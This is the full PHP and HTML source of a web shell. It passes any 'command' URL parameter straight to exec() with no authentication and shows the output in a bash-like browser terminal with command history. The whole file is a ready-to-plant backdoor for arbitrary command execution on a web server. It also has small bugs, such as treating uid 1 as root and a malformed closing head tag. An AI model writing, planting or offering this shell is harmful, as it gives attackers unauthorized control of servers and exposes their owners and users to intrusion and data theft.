<?php

ini_set('display_errors', 1);
if (isset($_GET['command']) && !empty($_GET['command'])) {
    $output = array();
    exec($_GET['command'], $output, $exit_code);

    $response = "";
    foreach ($output as $line) {
        $response .= $line."<br>";
    }
    die(json_encode(array("response" => $response, "exit_code" => $exit_code)));
}

function prompt() {
    $output = array();

    exec('cat /etc/hostname', $output);
    $hostname = $output[0];

    $output = array();
    exec('id', $output);
    $username = substr($output[0], strpos($output[0], '(')+1, strpos($output[0], ')')-strpos($output[0], '(')-1);

    $uid = substr($output[0], strpos($output[0], '=')+1, strpos($output[0], '()')-strpos($output[0], '=')-1);

    $output = array();
    exec('pwd', $output);
    $pwd = $output[0];

    $output = array();
    exec('echo $HOME', $output);
    $home = $output[0];

    return '['.$username.'@'.$hostname.' '.($home == $pwd ? '~' : substr($pwd, strrpos($pwd, '/')+1)).']'.($uid==1 ? '#' : '$').' ';
}
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Shell</title>
        <script src="//code.jquery.com/jquery-1.12.0.min.js"></script>
        <script>
        $(document).ready(function() {
            switch_prompt = function() {
                if ($('#prompt').attr('class') == 'active') {
                    $('#prompt').removeClass('active');
                    $('#prompt').addClass('inactive')
                } else if ($('#prompt').attr('class') == 'inactive') {
                    $('#prompt').removeClass('inactive');
                    $('#prompt').addClass('active')
                }
                setTimeout(switch_prompt, 500);
            }

            var history = [];
            var history_index = 0;

            var last_line = "";
            $('body').focus();
            $('#prompt').addClass('active');
            setTimeout(switch_prompt, 500);
            $('body').keypress(function(event) {
                event.preventDefault();
                if (event.key == 'Enter') {
                    if (last_line.trim().length == 0) {
                        $('#old_info').append('<?php echo prompt(); ?><br>');
                    } else {
                        $('#old_info').append('<?php echo prompt(); ?>'+last_line+'<br>');
                        $.getJSON('shell.php?command='+last_line.trim(), function(json) {
                            if (json.exit_code == 0) {
                                $('#old_info').append(json.response);
                            } else {
                                $('#old_info').append('bash: error<br>');
                            }
                            window.scrollTo(0,document.body.scrollHeight);
                        });

                        history.push(last_line);
                        history_index = history.length;
                        last_line = "";
                    }
                } else if (event.key == 'Backspace') {
                    last_line = last_line.substring(0, last_line.length - 1)
                } else if (event.key == 'ArrowUp') {
                    if (history_index > 0) {
                        last_line = history[--history_index];
                    }
                } else if (event.key == 'ArrowDown') {
                    if (history_index < history.length-1) {
                        last_line = history[++history_index];
                    } else {
                        last_line = "";
                    }
                } else if (event.key.length == 1 && event.key.match(/[ -~]/)) {
                    last_line += event.key;
                }
                $('#command').html(last_line);
            });
        });
        </script>
        <style>
        body {
            font-family: monospace;
        }

        #prompt.active::after {
            content: "█";
        }
        </style>
    <head>
    <body><div id="old_info"></div>
        <div id="new_info">
            <?php echo prompt(); ?><span id="command"></span><span id="prompt"></span>
        </div>
    </body>
</html>
